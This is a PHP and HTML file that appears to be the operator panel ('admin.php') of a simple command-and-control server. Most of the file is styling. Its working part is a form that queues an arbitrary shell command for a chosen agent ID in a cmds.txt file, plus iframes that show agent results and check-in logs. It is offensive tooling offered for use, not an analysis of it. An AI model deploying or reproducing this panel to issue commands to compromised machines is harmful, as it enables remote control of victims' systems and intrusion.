<html>
<head>
<style>


body, html {
  height: 100%;
  margin: 0;
}

.bg {
 
  background-image: url("https://static.vecteezy.com/system/resources/previews/003/217/491/large_2x/cyber-hacker-attack-background-skull-free-vector.jpg");
  height: 100%; 
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}

a:link, a:visited {
  background-color: #f44336;
  color: white;
  padding: 14px 25px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
}

a:hover, a:active {
  background-color: red;
}


.form-style-3{
	max-width: 450px;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
}
.form-style-3 label{
	display:block;
	margin-bottom: 10px;
}
.form-style-3 label > span{
	float: left;
	width: 100px;
	color: #F072A9;
	font-weight: bold;
	font-size: 13px;
	text-shadow: 1px 1px 1px #fff;
}
.form-style-3 fieldset{
	border-radius: 10px;
	-webkit-border-radius: 10px;
	-moz-border-radius: 10px;
	margin: 0px 0px 10px 0px;
	border: 1px solid #FFD2D2;
	padding: 20px;
	background: #FFF4F4;
	box-shadow: inset 0px 0px 15px #FFE5E5;
	-moz-box-shadow: inset 0px 0px 15px #FFE5E5;
	-webkit-box-shadow: inset 0px 0px 15px #FFE5E5;
}
.form-style-3 fieldset legend{
	color: #FFA0C9;
	border-top: 1px solid #FFD2D2;
	border-left: 1px solid #FFD2D2;
	border-right: 1px solid #FFD2D2;
	border-radius: 5px 5px 0px 0px;
	-webkit-border-radius: 5px 5px 0px 0px;
	-moz-border-radius: 5px 5px 0px 0px;
	background: #FFF4F4;
	padding: 0px 8px 3px 8px;
	box-shadow: -0px -1px 2px #F1F1F1;
	-moz-box-shadow:-0px -1px 2px #F1F1F1;
	-webkit-box-shadow:-0px -1px 2px #F1F1F1;
	font-weight: normal;
	font-size: 12px;
}
.form-style-3 textarea{
	width:250px;
	height:100px;
}
.form-style-3 input[type=text],
.form-style-3 input[type=date],
.form-style-3 input[type=datetime],
.form-style-3 input[type=number],
.form-style-3 input[type=search],
.form-style-3 input[type=time],
.form-style-3 input[type=url],
.form-style-3 input[type=email],
.form-style-3 select, 
.form-style-3 textarea{
	border-radius: 3px;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border: 1px solid #FFC2DC;
	outline: none;
	color: #F072A9;
	padding: 5px 8px 5px 8px;
	box-shadow: inset 1px 1px 4px #FFD5E7;
	-moz-box-shadow: inset 1px 1px 4px #FFD5E7;
	-webkit-box-shadow: inset 1px 1px 4px #FFD5E7;
	background: #FFEFF6;
	width:50%;
}
.form-style-3  input[type=submit],
.form-style-3  input[type=button]{
	background: #EB3B88;
	border: 1px solid #C94A81;
	padding: 5px 15px 5px 15px;
	color: #FFCBE2;
	box-shadow: inset -1px -1px 3px #FF62A7;
	-moz-box-shadow: inset -1px -1px 3px #FF62A7;
	-webkit-box-shadow: inset -1px -1px 3px #FF62A7;
	border-radius: 3px;
	border-radius: 3px;
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;	
	font-weight: bold;
}

</style>
</head>

<body>
<?php
$id = intval($_REQUEST['id']);
$sid = strval($id);
$cmd=$_REQUEST[ 'cmd' ];
$cmd=urldecode($cmd);
if (!empty($cmd)) {

$file = '../cmds.txt';
$current = file_get_contents($file);
$current .= $sid.":".$cmd.PHP_EOL;
file_put_contents($file, $current);

$file = '../res.txt';
$current = file_get_contents($file);
$current .= "Task to ".$sid." => ".$cmd.PHP_EOL;
file_put_contents($file, $current);

}



?>

<?php
 function del_res(){
file_put_contents('../res.txt', '');
}


  if (isset($_GET['del'])) {
    del_res();
  }
?>



<script>
function reloadfrm() {
  document.getElementById('iframeres').contentDocument.location.reload(true);
  document.getElementById('iframeping').contentDocument.location.reload(true);
  setTimeout(reloadfrm, 10000);
}



</script>
<div class="bg">
<div>


<div class="form-style-3">
<form method="post" action="admin.php">
<fieldset><legend>C2</legend>
<label for="field1"><span>Agent ID</span><input type="text" class="input-field" name="id" value="" /></label>
<label for="field2"><span>CMD</span><input type="text" class="input-field" name="cmd" value="" /></label>
<label><span> </span><input type="submit" value="Submit" /></label>
</label>
</fieldset>
</form>
</div>





<body onload="reloadfrm()"></body>
<a href='admin.php?del=true'>Delete Logs</a>

</div>

<div>
<iframe src='../res.txt' height=400 width=800 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='../ping.txt' height=400 width=800 id="iframeping" style="border:0;background-color: Black;"></iframe>

</div>

</div>
</body></html>
